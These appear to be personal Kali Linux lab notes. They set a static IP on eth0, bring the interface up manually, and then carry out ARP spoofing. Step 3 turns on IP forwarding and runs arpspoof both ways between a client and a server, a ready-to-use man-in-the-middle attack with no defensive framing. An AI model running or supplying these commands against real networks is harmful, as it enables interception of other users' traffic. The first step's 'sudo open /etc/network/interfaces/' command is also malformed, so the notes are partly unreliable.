#To be executed in Kali Terminal


1)sudo open /etc/network/interfaces/
#data to be entered in the file
# Loopback interface
auto lo
iface lo inet loopback

# Ethernet interface (change 'eth0' to your actual interface name)
auto eth0    # or ens33, enp0s3, etc. based on your output
iface eth0 inet static
    address xxx.xxx.xxx.xxx  # Your desired static IP
    netmask xxx.xxx.xxx.xxx      # Subnet mask
    gateway xxx.xxx.xxx.xxx       # Replace with your actual gateway (usually your router IP)

2)network setup
#run this in a terminal each time you restart
sudo ip link set eth0 up
sudo ip addr add xxx.xxx.xxx.xxx/24 dev eth0 #the static ip you set 
sudo ip route add default via xxx.xxx.xxx.xxx # Replace with your actual gateway (usually your router IP)
sudo systemctl restart networking

3)arpspoofing
sudo sysctl -w net.ipv4.ip_forward=1
sudo arpspoof -i eth0 -t client-ip server-ip
sudo arpspoof -i eth0 -t server-ip client-ip
